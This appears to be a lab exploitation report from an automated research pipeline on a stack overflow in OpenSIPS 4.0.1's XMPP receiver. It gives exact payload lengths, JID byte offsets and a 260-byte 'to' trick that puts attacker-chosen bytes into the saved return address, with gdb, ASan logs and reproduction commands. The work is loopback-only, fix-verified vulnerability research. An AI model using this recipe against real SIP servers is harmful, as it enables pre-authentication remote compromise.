# opensips2shell — live loopback receiver replay (2026-11-27)

Scope: GHSA-5gm5-wj62-p234, unbounded `sprintf` in `ENC_SIP_URI()` at stock
OpenSIPS tag `4.0.1`, tested against a **real receiver process**, not the
harness. Everything ran on 127.0.0.1 in `lab/opensips2shell-live/`; no external
probe and no marker execution. No witness replay existed when these results
were first recorded; the independent replay is appended below. Wake started
08:09:48Z; first live report observed 08:23:54Z.

## Builds and exact inputs

Upstream release tarballs fetched by provisioning `curl` from
`github.com/OpenSIPS/opensips/archive/refs/tags/<tag>.tar.gz`:

| tag | tarball sha256 |
| --- | --- |
| `4.0.1` | `248259e6741900ee10212894afdfc05f7db26d9be479b0364887a65d3c4771e0` |
| `4.0.2` | `5e268186500a6a1f5db7379e90d7e32a26f46752ebeba583c148662631bffed4` |

Three build trees: `401-asan` (`CC_EXTRA_OPTS=-fsanitize=address
-fno-omit-frame-pointer`, `LD_EXTRA_OPTS=-fsanitize=address`), `401-plain`
(`CC_EXTRA_OPTS=-fno-stack-protector`, no canary: `readelf` finds zero
`__stack_chk_fail` references), `402-asan` (ASan flags as above). All with
`make mode=debug modules module="xmpp tm sl proto_udp"`. Stock binaries:
`401-asan/opensips` sha256 `5be152adf42e501a87b01c71cde2785f7e8bdde808f35957c08e2ede389ad099`,
`401-asan/modules/xmpp/xmpp.so` sha256
`c1f99e190b760a370821df9d9bac801cb74075264258e40e9ea8031218d820b3`,
restored `401-plain/modules/xmpp/xmpp.so` sha256
`09d4c0b647950ee6545c810beec954e6565d093b2e6f3ed9881847482204a1cd`.
Instrumented source copy `probe-xmpp.c` sha256
`723ac70e8b0b8fead0f172eeae563ad4d49e0d788ff21212ebf14758ede526bd`.

Config (`opensips-xmpp.cfg.template`, filled by `run-live.sh`):
`log_level=4`, `stderror_enabled=yes`, `syslog_enabled=no`,
`loadmodule "proto_udp.so"`, `socket=udp:127.0.0.1:5060`, `loadmodule` for
`sl`, `tm`, `xmpp`, plus `modparam("xmpp","backend","server")`,
`xmpp_domain`/`xmpp_host` `127.0.0.1`, `xmpp_port=5269`, `route{xlog(...);}`.
The daemon is started `-F` under `setsid`, with stderr captured. Client
(`send_stanza.py`) sends one stream header and one
`<message from="..." to="victim@sip.domain" type="chat"><body>hi</body></message>`;
`from[i] = 'A' + i % 26`, 299 bytes by default, optional length argument.
For 299 bytes `from[252:268] = b'STUVWXYZABCDEFGH'`.

## Observed results

| build / JID | observed | evidence |
| --- | --- | --- |
| stock 4.0.1 ASan / 299 B | `AddressSanitizer: stack-buffer-overflow`, `WRITE of size 304`, frames `sprintf` → `xmpp_send_sip_msg` → `in_stream_node_callback` → expat → `xmpp_server_child_process`; receiver child exits status 1, parent shuts down | `evidence/daemon-401-asan.log` sha256 `d42995d658d66d33df57363e0b20fcc5fb1b510e13125bdb6a07eabbbb8744d7`, `evidence/wire-401-asan.log` sha256 `6d791c07e6be6180dfd3c9b1184aeee29ab97b06a2b6e91a73de9920668cb1b5` |
| stock 4.0.1 no-canary / 299 B | overflow occurs, no crash; `tm` reports `bad host name in URI <sip:victim@sip.domain>` after the sink | `evidence/daemon-401-plain.log`, `evidence/wire-401-plain.log` |
| stock 4.0.1 no-canary / 900 B | `segfault in process pid: 1441601`, `child process ... exited by a signal 11`, parent rc 139; `fm_malloc` needed `1111579232` bytes | `evidence/daemon-401-plain-long.log` sha256 `1cd9881b184ea5b8f1c084d01f5042fd805a661b46edde831028953ca4288258` |
| instrumented 4.0.1 no-canary / 900 B | `PROBE buf_from=7fff8893d820 rip=7fff8893dba8 delta=904 fromstr_s=5857565554535251 fromstr_len=1111579225 ripbytes=0007c310837e0000`, then `fm_malloc` need `1111579232`, then SIGSEGV | `evidence/daemon-401-probe-long.log` sha256 `6883600d54b8309e57606f5b1838636b606b5896d374e9b2fb471ba9496f3a6c` |
| instrumented 4.0.1 no-canary / 299 B | `fromstr_s` equals `buf_from`, `fromstr_len=303`, no segfault | `evidence/daemon-401-probe-299.log` |
| stock 4.0.2 ASan / 299 B and 900 B | `instream callback: 1: message` then `ignoring message stanza before dialback authentication`; no ASan report, no crash | `evidence/daemon-402-asan.log` sha256 `42c6844a247a631a1947c40b7f8d08da0c39bf09bfc89b72139c21408c5f53e4`, `evidence/daemon-402-asan-long.log` |

ASan's frame description for the live stock overflow is exact:
`[192,448) 'buf_from' (line 283)`, write address at frame offset 448,
`[512,1024) 'buf' (line 282) <== Memory access at offset 448 partially
underflows this variable`. The write is 48 bytes past the 256-byte array,
matching the harness. The receiver's stream reply was captured before the
stanza: `<?xml version='1.0'?><stream:stream ... from='127.0.0.1'>` plus
`<stream:features .../>`; after the ASan abort the next read was `b''`.

## Rung assessment

- **Rung 3 confirmed in a live stock build**: ASan observes the 304-byte write
  at the pinned sink inside a real OpenSIPS 4.0.1 XMPP receiver reached by an
  unauthenticated stanza on a loopback listener. No harness frame is involved
  in this observation.
- **Rung 4 demonstrated security impact, with stated conditions**: in the
  instrumented live no-canary frame, four chosen bytes from the JID land in
  `fromstr.len` (`0x42415a59` = `1111579225`, ASCII `YZAB`, corresponding to
  `from[804:808]`) and chosen bytes land in `fromstr.s`
  (`0x5857565554535251`, ASCII `QRSTUVWX`). The live process then requests a
  `1111579232`-byte shared-memory allocation (`fromstr_len + 7`) and dies with
  SIGSEGV. The probe only *reads* these fields; the overflow and allocation are
  the stock code. With the 299-byte JID the same fields are intact
  (`fromstr_len=303`) and no crash occurs; 4.0.2 ignores the stanza before
  dialback and neither overflows nor crashes.
- **Not claimed**: control-flow diversion. In the instrumented frame the
  saved-RIP slot is 904 bytes past `buf_from` and received only the final NUL
  (`ripbytes=0007c310837e0000`). Stock 4.0.1 disassembly places the saved RIP
  at `rbp+8`, i.e. `buf_from+888`, so a 900-byte JID would put chosen bytes
  `from[884:892]` there, but the stock process died inside `tm` before return
  and no overwritten RIP was observed. **Rung 5 UNKNOWN**: no benign marker,
  no pointer-control execution, no ASLR/NX measurement, no remote path outside
  this plant's loopback listener. The independent witness replay below
  confirmed these labels and found no rung-5 evidence.

## Negative results preserved

Initial configs with `fork=no`, a `socket=` before `proto_udp.so`, and an empty
`route{}` failed to parse (rc 255); fixed by removing `fork=no`, loading
`proto_udp.so` first, and adding an `xlog` statement. Stock 4.0.1 no-canary
with the 299-byte JID did not crash: the 48 overflow bytes do not reach a live
pointer in that frame. The instrumented probe changes the stack layout
(`delta=904` instead of the stock frame's 888), so its RIP observation is a
measurement of the instrumented frame only.

- Raw-NUL gate (08:59Z): a throwaway sender put four raw NUL bytes at JID
offsets 804–807 of a 900-byte JID. The receiver logged the `stream (fd) read`
but emitted no `instream callback: 1: message` and no allocation or crash;
daemon rc 0, port 5269 closed afterwards. The bytes that would make the
overwritten `fromstr.len` small therefore do not reach the sink in this XML
parser. Probe and log:
`.mishe-tauftauf/artifacts/opensips2shell-nul-gate/` (`probe.py` sha256
`46d700b5789b665c8187b193e577b8aa92c5bc359c70fd763e15292a06ed7e68`,
`daemon-nul.log` sha256
`38dc18a00521403916dd584d9ac74a9ec75d1ef01b29e0f97d604edfef58967d`).
Source check: `ut.h:818-832` `shm_str_dup` passes the overwritten length
straight to `shm_malloc`, so a huge (or wrapped) length cannot survive `tm`
to the stock saved-RIP slot at `buf_from+888`. No marker or control-flow
attempt was made.

## Independent witness replay (W328, 2026-11-27 08:45–08:50Z)

Witness inbox #6255; detail at
`.mishe-tauftauf/artifacts/witness-w328-opensips/detail.md`. The witness took a
clean `git archive` of `lab/frontier/opensips2shell` and
`lab/opensips2shell-live` at commit `9f01094a` into
`/tmp/w328-opensips-clean`; all traffic was 127.0.0.1:5269 and no listener was
left behind. Tarball, `401-asan/opensips`, both `xmpp.so` and `probe-xmpp.c`
hashes matched this report. The unmodified harness control returned rc 0,
26 PASS / 0 FAIL, canonical trace sha256 `a69657bb…` byte-identical. Author
logs hashed exactly as reported. Fresh witness cases:

| case | observed | fresh log sha256 prefix |
| --- | --- | --- |
| `401-asan` / 299 B | `stack-buffer-overflow`, `WRITE of size 304`, frames `vsprintf` → `sprintf` → `xmpp_send_sip_msg` → `in_stream_node_callback` → expat → `xode_stream_eat` → `xmpp_server_child_process`; `buf_from` `[192,448)` underflows `buf` `[512,1024)` | `7dc7801db89b155f…` |
| `401-plain` / 900 B | `fm_malloc` need `1111579232`, SIGSEGV, daemon rc 139 | `ca70a65c8e06d033…` |
| `402-asan` / 900 B | `ignoring message stanza before dialback authentication`, no ASan report, daemon rc 0 | `fdb3b245c586198d…` |
| `401-plain` / 299 B (extra control) | no segfault; `bad host name in URI <sip:victim@sip.domain>` after the sink | not hashed in the detail |

Counterexample hunt: the witness rebuilt the instrumented module from the
clean source and changed only `from[804:808]` from `YZAB` to `CDEF`.
`fromstr_len` changed from 1111579225 to 1178944579 (`0x46454443`) and the
**stock** no-canary `fm_malloc` need changed from 1111579232 to 1178944584,
both still SIGSEGV. The chosen wire bytes therefore drive the overwritten
length field and allocation in the stock build, not only in the instrumented
frame. Negative results preserved: `fromstr_s` stayed `QRSTUVWX`; `ripbytes`
were ASLR-dependent real code bytes (`0017ed0e40740000` /
`000714f7ca740000`), not chosen JID bytes; two early probe runs failed rc 127
because the private build tree was placed at the archive root, then succeeded
after moving it inside `lab/opensips2shell-live`. No marker, exec,
control-flow diversion or off-loopback traffic.

Witness verdict: **ESTABLISHED AS LABELED** — rung 3 confirmed in a live stock
receiver, rung 4 demonstrated chosen-field control with an observed
allocation-size change in stock and instrumented live builds under the stated
no-canary/loopback/900-byte conditions. No grade change and NO rung 5.

## Early-return control-flow diversion (2026-11-27 09:27–09:29Z)

A second bypass of the `tm` gate exists in stock 4.0.1 source
(`xmpp.c:291-299`): `uri_xmpp2sip(to, &tostr.len)` has an early `return -1`
before `run_tm_api`. With `sip_domain` unset in this config, that helper
returns NULL when `5 + strlen(to) > 256`. A 260-byte `to` therefore makes
`xmpp_send_sip_msg` return through the overwritten saved-RIP slot without
entering `tm` at all.

Method: stock no-canary `401-plain/modules/xmpp/xmpp.so` (hash unchanged,
`09d4c0b6…`), launched under `gdb -batch` with `set follow-fork-mode child`
(the first fork is the "XMPP receiver"), one stream header and one
`<message/>` on 127.0.0.1:5269. `from` is 900 bytes with an 8-byte chosen
marker at JID offsets 884-891; the stock saved RIP is `buf_from+888`, so JID
offset 884 is its low byte. Sender/gdb scripts: `send_early.py` sha256
`850a5fa1c8a5f068719d78ca8988f04b3f94aa489f7c52681211cfafad3fd551`,
`gdb-early.cmd`.

Observed (two runs, only the marker changed):

| marker at JID 884 | saved RBP `[rbp]` | saved RIP `[rbp+8]` | gdb frame `#1` |
| --- | --- | --- | --- |
| `RIPCNTRL` | `0x5a59585756555453` (`STUVWXYZ`) | `0x4c52544e43504952` (`RIPCNTRL`) | `0x4c52544e43504952` |
| `ABCDEFGH` | same (`STUVWXYZ`) | `0x4847464544434241` (`ABCDEFGH`) | `0x4847464544434241` |

Both runs logged `ERROR:xmpp:uri_xmpp2sip: Buffer overflow` and
`ERROR:xmpp:xmpp_send_sip_msg: Failed to translate xmpp uri to sip uri`,
proving the early return was taken, then stopped on SIGSEGV at
`xmpp_send_sip_msg+631`. Disassembly shows `0x929a` (function offset `+631`)
is exactly the function's `ret`. gdb keeps `#0` at the `ret` because the
chosen target `0x4c52…` / `0x4847…` is non-canonical (bits 63:48 !=
sign-extended bit 47), so #GP is raised at the return instruction. The
overwritten return address is the attacker's eight chosen wire bytes in a
**stock** live receiver; control transfer was attempted but no chosen
address executed.

Evidence: `artifacts-early/gdb-stock-early.log` sha256
`956e3e2dba84c851a546801e906a8ac57dcecb4904726703f697751de551c76d`,
`artifacts-early/gdb-stock-early-2.log` sha256
`90a49a155dae19ae9ec273181ef1c49af78847d2878c258b966b3f228b0e1c82`, wire
logs `68c25577e34f14a05e2772a847470f407031dbf419d40ae6fe71078261c9a7b5`
and `1647dc1b193b58e9d15041e12c6d292ebc6debab5079017ea79661bd21ffcc17`.
Loopback only; no listener left behind; no marker, pointer dereference or
rung-5 claim.

Assessment: this upgrades rung-4 mechanics from "chosen bytes corrupt a
length field" to "chosen bytes become the saved return address and the CPU
attempts the transfer", in a stock build without entering `tm`. It is still
**rung 4**: the target was non-canonical, so no attacker-chosen code ran.
Rung 5 remains UNKNOWN — no valid canonical target, no benign command, no
observed side effect from executed chosen bytes. A partial overwrite of the
low return-address bytes (JID length 885/886) is a separate, unrun
hypothesis; ASCII/UTF-8 attribute bytes cannot encode the leading NUL bytes
of a full 64-bit canonical stack or module address.

## Reproduction

```
cd lab/opensips2shell-live
bash run-live.sh 401-asan 401-asan 299
bash run-live.sh 401-plain 401-plain 299
bash run-live.sh 401-plain 401-plain-long 900
bash run-live.sh 402-asan 402-asan 299
bash run-live.sh 402-asan 402-asan-long 900
```

`probe-xmpp.c` is the instrumented copy of
`modules/xmpp/xmpp.c` at stock 4.0.1; copying it over
`401-plain/modules/xmpp/xmpp.c` and rebuilding that module with
`-fno-stack-protector` reproduces the probe runs. Restore from
`src/opensips-4.0.1/modules/xmpp/xmpp.c` for the stock build.

Post-commit smoke at 08:29Z: harness replay into `/tmp/opensips2shell-smoke`
again printed `ALL CHECKS PASSED rc 0` and trace sha256
`a69657bb243b83b850b332a4307996f5705d6b0bd6b3cdefbccba022c0c78b06`;
`bash run-live.sh 401-asan 401-asan-smoke 299` again produced the live ASan
overflow (`evidence/daemon-401-asan-smoke.log`). No listener left running.

Adjacent-lane candidate recorded, not worked: GHSA-qc7q-vrx3-3j4h
(`sip_i` `parse_isup` `memcpy` of attacker length into `val[128]`, affected
`>=4.0.0,<4.0.2` and `>=3.6.0,<3.6.9`, patched `4.0.2`/`3.6.9`, pre-auth SIP
INVITE with `Content-Type application/isup`). Operator inbox #6227, 2026-11-27.
